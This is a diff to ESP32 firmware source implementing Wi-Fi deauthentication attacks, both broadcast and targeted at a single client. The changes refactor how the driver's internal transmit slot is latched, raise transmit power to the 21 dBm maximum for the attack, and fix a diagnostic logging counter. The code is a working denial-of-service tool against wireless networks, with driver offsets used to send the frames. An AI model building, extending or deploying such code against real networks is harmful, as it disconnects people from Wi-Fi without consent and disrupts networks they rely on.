@@ -15,7 +15,7 @@ uint32_t txTestSent = 0, txTestFail = 0;
 // DIAGNOSTIC (§11): FC byte0 written on the internal kick path. 0xC0 = deauth (the real attack). Set to
 // 0x80 with "kickfc 80" to send a beacon down the SAME descriptor path: the witness then tells us whether
 // that path radiates at all, separating "internal path is dead" from "deauth subtype is dropped".
-// latchDeauthSlot() puts it back to 0xC0 whenever an attack starts, so a forgotten override from an
+// resetDeauthSlot() puts it back to 0xC0 whenever an attack starts, so a forgotten override from an
 // earlier session cannot quietly turn the next "attack" into a beacon flood while `da` climbs normally.
 volatile uint8_t kickFc = 0xC0;
 // Which transmit path the attack uses. The raw esp_wifi_80211_tx path is the default because it is
@@ -61,35 +61,46 @@ extern "C" {
     extern char g_ic[] __attribute__((aligned(4)));
 }
 
-// Shared prologue for both attack modes: clear the diagnostic FC override, then latch the driver's hmac
-// slot and the state byte that decides the DA/SA/BSSID mapping inside send_setup. Callers hold g_devMux.
+// The internal path's hmac slot word, read without assuming slotPad is word-aligned in memory.
+static uint32_t internalSlotWord() {
+    uint32_t w;
+    memcpy(&w, deauth.slotPad, 4);
+    return w;
+}
+
+// Shared prologue for both attack modes. Callers hold g_devMux, so this only resets state - no blob reads,
+// no Serial. Every attack starts as a real deauth: kickFc is sticky diagnostic state that survives
+// stopDeauth(), and left at 0x80 from a "kickfc 80" run it would make the next attack emit beacons while
+// deauth.sent counted them as kicks (the deauth/dca acks echo the value in force). The internal path's slot
+// is cleared here and latched lazily (latchInternalSlot) only if that path is actually used, so the default
+// raw path never touches the hard-coded libnet80211.a offsets (rule 8).
+static bool slotLatched = false;
+static void resetDeauthSlot() {
+    kickFc = 0xC0;
+    memset(deauth.slotPad, 0, 4);
+    deauth.hstate = 0xFF;
+    slotLatched = false;
+}
+
+// DIAGNOSTIC (internal path only, "kickpath 1"): latch the driver's hmac slot and the state byte that decides
+// the DA/SA/BSSID mapping inside send_setup. Loop task (serviceDeauth), outside g_devMux, once per attack.
 //
 // slotWord being 0 means neither the STA nor the AP interface has an ieee80211com yet (Wi-Fi not up, or a
 // core whose layout these offsets do not describe). Dereferencing it read address 0x138 and panicked;
-// serviceDeauth() already treats a zero slot as "use raw TX" (which is the default anyway), so record
-// it and let it.
-static void latchDeauthSlot() {
-    // Every attack starts as a real deauth. kickFc is sticky diagnostic state that survives stopDeauth();
-    // left at 0x80 from a "kickfc 80" run it would make the next attack emit beacons while deauth.sent
-    // counted them as kicks. The deauth/dca acks echo the value that is actually in force.
-    kickFc = 0xC0;
+// serviceDeauth() treats a zero slot as "use raw TX", so record it and let it.
+static void latchInternalSlot() {
+    slotLatched = true;
     // Note: these are *adjacent* BSS words (g_ic+16 / g_ic+20 hold the STA/AP hmac pointers), not
     // fields of the ic struct g_ic itself points at.
     uint32_t slotWord = *(volatile uint32_t*)(g_ic + 16);   // STA hmac
-    if (!slotWord) {
-        slotWord = *(volatile uint32_t*)(g_ic + 20);   // fall back to AP
-
-        // DIAGNOSTIC: Log fallback to AP path every time
-        if (serialRoom(70))
-            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth start FALLBACK to AP slot\"}\n");
-    }
+    const bool fellBack = !slotWord;
+    if (fellBack) slotWord = *(volatile uint32_t*)(g_ic + 20);   // fall back to AP
     memcpy(deauth.slotPad, &slotWord, 4);
     deauth.hstate = slotWord ? *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312) : 0xFF;
-
-    // DIAGNOSTIC: Log hstate value once at start (critical for understanding address mapping)
-    if (serialRoom(90))
-        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth start hstate=0x%02x slot=0x%lx\"}\n",
-                     deauth.hstate, static_cast<unsigned long>(slotWord));   // uint32_t is long on this target
+    // hstate picks the address mapping; the slot word shows whether the offsets found an interface at all.
+    if (serialRoom(110))
+        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth slot 0x%lx hstate 0x%02x%s\"}\n",
+                      static_cast<unsigned long>(slotWord), deauth.hstate, fellBack ? " (AP fallback)" : "");
 }
 
 // The channel a BSSID was last heard on, or 0. Callers hold g_devMux: the Wi-Fi task memsets slots in
@@ -110,11 +121,12 @@ void startDeauth(const uint8_t* mac) {
     deauth.sent = 0;
     deauth.txFail = 0;
     deauth.startMs = millis();
-    deauth.dumped = false;
-    latchDeauthSlot();
+    resetDeauthSlot();
     deauth.active = true;
     portEXIT_CRITICAL(&g_devMux);
-    (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
+    // TX power is in 0.25 dBm units, range 8-84: 84 = 21 dBm, the maximum. (This used to pass 160, "16 dBm",
+    // which is out of range; startWifi's 82 is already 20.5 dBm, so the attack gains at most 0.5 dB here.)
+    (void)esp_wifi_set_max_tx_power(84);
     if (deauth.parked) setPark(-1);                    // restart of a running attack: re-park below
     deauth.parked = false;
     if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauth.parked = true; } }
@@ -131,11 +143,10 @@ void startDeauthTargeted(const uint8_t* clientMac, const uint8_t* apBssid) {
     deauth.sent = 0;
     deauth.txFail = 0;
     deauth.startMs = millis();
-    deauth.dumped = false;
-    latchDeauthSlot();
+    resetDeauthSlot();
     deauth.active = true;
     portEXIT_CRITICAL(&g_devMux);
-    (void)esp_wifi_set_max_tx_power(160);
+    (void)esp_wifi_set_max_tx_power(84);    // 21 dBm, see startDeauth
     if (deauth.parked) setPark(-1);
     deauth.parked = false;
     if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauth.parked = true; } }
@@ -148,7 +159,7 @@ void stopDeauth() {
     deauth.targeted = false;
     memset(deauth.targetMac, 0, 6);
     portEXIT_CRITICAL(&g_devMux);
-    (void)esp_wifi_set_max_tx_power(82);   // back to startWifi's quiet-sniffing level (startDeauth raised it to 16 dBm)
+    (void)esp_wifi_set_max_tx_power(82);   // back to startWifi's 20.5 dBm (0.25 dBm units)
     // If hunt re-parked after us, this unparks its park too: last writer wins, hopping resumes.
     if (deauth.parked) { setPark(-1); deauth.parked = false; }
 }
@@ -313,7 +324,7 @@ void sendInternalKick() {
 
                 // DIAGNOSTIC: Log sequence number periodically (every 4th frame uses less buffer space than full dump)
         static uint32_t seqLogCount = 0;
-        if ((seqLogCount & 3u) == 0 && serialRoom(60)) {
+        if ((seqLogCount++ & 3u) == 0 && serialRoom(60)) {
             Serial.printf("{\"t\":\"log\",\"msg\":\"deauth seq=0x%02x%02x #%lu\"}\n", 
                          D[off + 22], D[off + 23], frameSeq - 1);
 
@@ -360,13 +371,16 @@ void serviceDeauth() {
         stopDeauth();
         return;
     }
-    if (useInternalKick && *(const uint32_t*)deauth.slotPad) {   // driver-internal slot: dead, kept for §9 work
+    // The blob offsets are read only on the internal path; the raw path never touches them (rule 8). The slot is
+    // latched on first use, so "kickpath 1" also takes effect on an attack that is already running.
+    if (useInternalKick && !slotLatched) latchInternalSlot();
+    if (useInternalKick && internalSlotWord()) {   // driver-internal slot: dead, kept for §9 work
         for (int k = 0; k < 4; k++) sendInternalKick();
+        if (deauth.sent == 4 && serialRoom(160))   // one report after the first burst: home-channel flag + deferred-TX queue words (g_ic+436/+440)
+            Serial.printf("{\"t\":\"log\",\"msg\":\"home %d q %lx/%lx\"}\n", chm_is_at_home_channel(),
+                          static_cast<unsigned long>(*(volatile uint32_t*)(g_ic + 436)),
+                          static_cast<unsigned long>(*(volatile uint32_t*)(g_ic + 440)));
     } else {
         for (int k = 0; k < 4; k++) sendKickFrame(deauth.bssid);   // raw TX: the path that reaches the air
     }
-    if (deauth.sent == 4 && serialRoom(160))   // one report after the first burst: home-channel flag + deferred-TX queue words (g_ic+436/+440)
-        Serial.printf("{\"t\":\"log\",\"msg\":\"home %d q %lx/%lx\"}\n", chm_is_at_home_channel(),
-                      *(volatile uint32_t*)(g_ic + 436),
-                      *(volatile uint32_t*)(g_ic + 440));
 }
